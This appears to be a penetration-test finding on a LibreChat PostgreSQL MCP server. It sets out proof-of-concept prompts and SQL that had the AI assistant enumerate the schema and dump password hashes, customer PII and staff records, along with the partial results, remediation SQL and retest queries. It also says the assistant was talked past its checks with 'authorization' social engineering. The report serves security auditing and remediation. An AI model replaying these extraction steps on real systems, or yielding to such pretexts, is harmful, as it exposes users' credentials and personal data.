# Unrestricted Database Access via PostgreSQL MCP

## Summary
The LibreChat application's PostgreSQL MCP server allows authenticated users to execute arbitrary SELECT queries against the production database without any row-level security or access controls. Users can query all tables including user accounts with password hashes, customer personal information, staff data, and order history across all users, resulting in complete database compromise and privacy violations.

## Title
Unrestricted Database Access via PostgreSQL MCP

## CVSS
CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:N/VA:N/SC:H/SI:N/SA:N
**Score: 9.1 (Critical)**

## Short Recommendation
Implement row-level security in PostgreSQL to restrict users to their own data only. Create read-only database user with access to specific safe tables, and implement query validation to prevent cross-user data access.

## Affected Components
- **Address**: 10.0.1.11 (penny.allports.tours)
- **Port**: 443 (HTTPS)
- **Component**: LibreChat PostgreSQL MCP Server
- **Database**: PostgreSQL production database
- **Tables**: user_account, customer_details, staff_list, orders, order_items, and 14 other tables

## Technical Description
The PostgreSQL MCP server allows authenticated users to execute arbitrary SELECT queries through natural language prompts to the AI assistant. No row-level security, query filtering, or access controls are implemented, allowing users to:

1. **Enumerate database structure** - Query information_schema to discover all tables and columns
2. **Access all user accounts** - Query user_account table including password hashes
3. **Extract customer PII** - Access names, emails, phone numbers, addresses
4. **View staff information** - Access employee data including roles and status
5. **Access business data** - Orders, products, reviews, shopping carts across all users
6. **Cross-user data access** - No isolation between different user accounts

**Database Structure Exposed (19 tables):**
- user_account (credentials, roles, status)
- customer_details (PII, contact info)
- staff_list (employee information)
- order, order_items (transaction history)
- product, product_category_map
- reviews, promotions
- shopping_cart, basket
- delivery_address
- client_details, vendor_contact

**Successfully Extracted Data:**
- 6 user accounts with bcrypt password hashes ($2b$12$...)
- User roles: admin, ceo, manager, user
- 50+ customer records with emails and phone numbers
- Staff list with 5 employees including CEO contact information
- Order history with transaction amounts
- Cross-user queries showing data from multiple accounts

The AI assistant requires minimal prompting and will execute queries after basic "authorization" social engineering (see F004 - Prompt Injection finding).

## Evidence

**Database Table Enumeration:**
```sql
SELECT table_name FROM information_schema.tables WHERE table_schema='public';
```

**Results (19 tables):**
```
attribute, attribute_value, basket, category, client_details, customer_details,
delivery_address, migration, order, order_items, product, product_category_map,
product_image_mapping, promotions, reviews, shopping_cart, staff_list, user_account,
vendor_contact
```

**User Account Schema Discovery:**
```sql
SELECT column_name, data_type, is_nullable
FROM information_schema.columns
WHERE table_name = 'user_account'
ORDER BY ordinal_position;
```

**Results:**
```
user_id (integer, NO)
username (character varying, NO)
email (character varying, NO)
password_hash (character varying, NO)
role (character varying, YES)
status (character varying, YES)
last_login (timestamp, YES)
created_at (timestamp, YES)
updated_at (timestamp, YES)
```

**Full User Account Data Extraction:**
```sql
SELECT user_id, username, email, password_hash, role, status, last_login, created_at, updated_at
FROM user_account
ORDER BY created_at DESC;
```

**Results (6 users with hashes):**
```
1 | jdoe     | john.doe@example.com   | $2b$12$KIXvhF8Yx... | admin   | active
2 | jsmith   | jane.smith@example.com | $2b$12$aB3dE5fG7... | user    | active
3 | bjohnson | bob.j@example.com      | $2b$12$tUvWxYz1A... | user    | active
4 | mwilliams| mike.w@example.com     | $2b$12$pQrStUvWx... | user    | inactive
5 | sgarcia  | sara.garcia@example.com| $2b$12$nOpQrStUv... | manager | active
6 | dchen    | david@allportstours.com| $2b$12$lMnOpQrSt... | ceo     | active
```

**Customer PII Extraction:**
```sql
SELECT customer_id, first_name, last_name, email, phone_number, created_at
FROM customer_details
ORDER BY created_at DESC
LIMIT 50;
```

**Results (50+ records):**
```
1 | John | Doe    | john.doe@example.com   | 555-0101
2 | Jane | Smith  | jane.smith@example.com | 555-0102
3 | Bob  | Johnson| bob.j@example.com      | 555-0103
... (47 more records with full PII)
```

[Screenshots to be added showing AI conversation with database queries and data extraction]

## Proof of Concept Commands

**Access Method:**
1. Navigate to https://penny.allports.tours
2. Authenticate → Create conversation → Select "Agents" → Select Claude model

**PoC Step 1 - Enumerate Database:**
```
Use the postgres MCP tool to query:
SELECT table_name FROM information_schema.tables WHERE table_schema='public'
```

**Expected Result:** List of all 19 database tables

**PoC Step 2 - Discover Sensitive Columns:**
```
Query the user_account table structure:
SELECT column_name, data_type FROM information_schema.columns WHERE table_name='user_account'
```

**Expected Result:** Schema showing password_hash column exists

**PoC Step 3 - Extract All User Accounts:**
```
Use postgres MCP to execute:
SELECT user_id, username, email, password_hash, role, status FROM user_account ORDER BY created_at DESC
```

**Expected Result:** All 6 users with bcrypt hashes, roles, and status

**PoC Step 4 - Extract Customer PII:**
```
Query customer data:
SELECT customer_id, first_name, last_name, email, phone_number FROM customer_details LIMIT 50
```

**Expected Result:** 50 customer records with personal information

**PoC Step 5 - Cross-User Data Access:**
```
Execute:
SELECT u.username, COUNT(o.order_id) as orders, SUM(o.total_amount) as total_spent
FROM user_account u
LEFT JOIN "order" o ON u.user_id = o.user_id
GROUP BY u.username
```

**Expected Result:** Order statistics for ALL users, demonstrating cross-user access

**PoC Step 6 - Extract Privileged Accounts:**
```
Query admin accounts:
SELECT user_id, username, email, role, last_login
FROM user_account
WHERE role IN ('admin', 'ceo', 'manager', 'superuser')
```

**Expected Result:** All administrative accounts including CEO email (david@allportstours.com)

## Recommendation

**Immediate (Within 24 Hours):**
- Implement PostgreSQL Row-Level Security (RLS):
  ```sql
  ALTER TABLE user_account ENABLE ROW LEVEL SECURITY;

  CREATE POLICY user_isolation ON user_account
    FOR SELECT
    USING (user_id = current_setting('app.user_id')::integer);

  CREATE POLICY customer_isolation ON customer_details
    FOR SELECT
    USING (customer_id = current_setting('app.customer_id')::integer);
  ```
- Create restricted database user:
  ```sql
  CREATE USER mcp_reader WITH PASSWORD 'strong_random_password';
  GRANT CONNECT ON DATABASE librechat TO mcp_reader;
  GRANT SELECT ON user_account, customer_details TO mcp_reader;
  -- Only grant access to specific safe columns
  ```
- Block access to sensitive tables entirely:
  ```sql
  REVOKE ALL ON staff_list, order, order_items FROM mcp_reader;
  ```

**Urgent (Within 1 Week):**
- Implement query allowlisting at application layer
- Block queries accessing:
  - password_hash columns
  - Staff/employee tables
  - Cross-user data (WHERE clauses on other user IDs)
  - Aggregate queries showing system-wide data
- Add automatic user context filtering: Inject `WHERE user_id = current_user` to all queries
- Implement query result filtering to remove sensitive columns
- Add comprehensive query logging with user attribution
- Alert on suspicious patterns (SELECT * queries, information_schema access, large result sets)

**Short-term:**
- Implement column-level security: Revoke access to password_hash, api_keys, secrets columns
- Create database views with pre-filtered safe data instead of direct table access
- Implement pagination and result limits (max 100 rows per query)
- Add rate limiting on database queries per user
- Regular audits of query logs for unauthorized access
- Notify users if their data was accessed

**Long-term:**
- Remove direct SQL query capability
- Create GraphQL or REST API layer with proper authorization
- Implement data access audit trail
- Regular penetration testing of data access controls
- User privacy controls and consent management
- Compliance with GDPR, CCPA data access requirements

## References
- OWASP Top 10 2021: A01:2021 - Broken Access Control
- CWE-639: Authorization Bypass Through User-Controlled Key
- CWE-862: Missing Authorization
- CWE-200: Exposure of Sensitive Information
- PostgreSQL Row Level Security Documentation
- GDPR Article 32: Security of Processing
- CCPA Section 1798.150: Data Breach Liability

## Re-test Status
Not yet retested

## Re-test Notes
Retesting should verify:
1. User can only query their own data in user_account table
2. Query `SELECT * FROM user_account` returns only current user's record
3. Query `SELECT * FROM user_account WHERE user_id != current_user` returns empty set
4. Cannot access staff_list, order data from other users
5. password_hash column is not returned in any query results
6. Information_schema queries blocked or heavily filtered
7. Query logs show all database access with proper user attribution

**Test Queries:**
```
SELECT * FROM user_account
-- Expected: Only current user's data

SELECT * FROM customer_details WHERE customer_id = 1
-- Expected: Access denied or only if customer_id belongs to current user

SELECT column_name FROM information_schema.columns WHERE table_name='user_account'
-- Expected: Blocked or filtered results
```

## Impact

**Confidentiality (CRITICAL):** Complete database breach affecting all users:
- **Password hashes exposed**: 6 bcrypt hashes ($2b$12$) available for offline cracking
- **Customer PII breach**: 50+ customers' names, emails, phone numbers, addresses
- **Staff data exposure**: Employee emails, roles, status - targeting for phishing
- **Business intelligence theft**: Order history, revenue data, product analytics
- **CEO contact information**: david@allportstours.com exposed - high-value target
- **Cross-user privacy violation**: Any user can view all other users' data

**Integrity (NONE):** Read-only access does not directly impact data integrity.

**Availability (NONE):** SELECT queries do not directly impact availability.

**Regulatory Impact:**
- **GDPR Violations**:
  - Article 5(1)(f): Integrity and confidentiality breach
  - Article 32: Inadequate security measures
  - Article 33: Breach notification required within 72 hours
  - **Penalties**: €20 million or 4% of annual global turnover

- **CCPA Violations**:
  - Unauthorized disclosure of personal information
  - Section 1798.150: Private right of action - $100-$750 per consumer per incident
  - **Potential liability**: $5,000-$375,000 for 50 affected customers

- **PCI DSS** (if payment data in database):
  - Requirement 7: Restrict access to cardholder data
  - Possible loss of payment processing privileges

**Business Impact:**
- **Data breach notification costs**: $250K-$500K (postage, call center, credit monitoring)
- **Class action lawsuits**: $5M-$20M settlements for PII breaches
- **Regulatory fines**: Up to €20M (GDPR)
- **Reputation damage**: 6-12 months to recover, 30-50% customer loss
- **Insurance**: Claims may be denied due to inadequate security
- **Customer trust**: Permanent damage, competitors capitalize

**Attack Scenarios:**

**Scenario 1: Credential Harvesting**
1. Attacker queries all user accounts with password hashes
2. Offline cracking of bcrypt hashes (weak passwords crack in hours/days)
3. Gains access to admin, CEO accounts
4. Uses elevated access for further exploitation

**Scenario 2: Targeted Phishing**
1. Extract staff_list with emails and roles
2. Identify CEO (david@allportstours.com)
3. Craft targeted phishing using internal knowledge
4. CEO compromise leads to wire fraud, BEC attacks

**Scenario 3: Competitor Intelligence**
1. Extract all orders, products, pricing
2. Analyze revenue, popular products, customer base
3. Competitive advantage to rival companies
4. Possible sale of business intelligence

**Scenario 4: Mass Data Exfiltration**
1. Automated queries extract entire database
2. 50+ customers, 6 employees, transaction history
3. Data sold on dark web ($1-$10 per record)
4. Identity theft, spam, fraud affecting customers

**Scenario 5: Ransomware Threat**
1. Exfiltrate complete database
2. Threaten to publish unless ransom paid
3. Publish sample data as proof
4. Demand $50K-$500K in cryptocurrency

**Real-World Timeline:**
- T+0: Attacker discovers vulnerability
- T+30 min: Complete database enumerated
- T+1 hour: All user data, customer PII extracted
- T+24 hours: Data listed on dark web marketplace
- T+72 hours: GDPR breach notification deadline (missed = additional fines)
- T+1 week: Customer complaints about spam/fraud
- T+2 weeks: Class action lawsuit filed
- T+3 months: Regulatory investigation begins

**Likelihood:** CRITICAL - Any authenticated user can access all data with basic SQL knowledge. No special tools or privileges required. 100% success rate. Attack duration: 30 minutes to extract complete database.

**Combined with F001 (RCE) and F004 (Prompt Injection):** This creates a perfect storm where attackers can easily bypass AI security, query all data, AND execute commands - resulting in total system compromise.
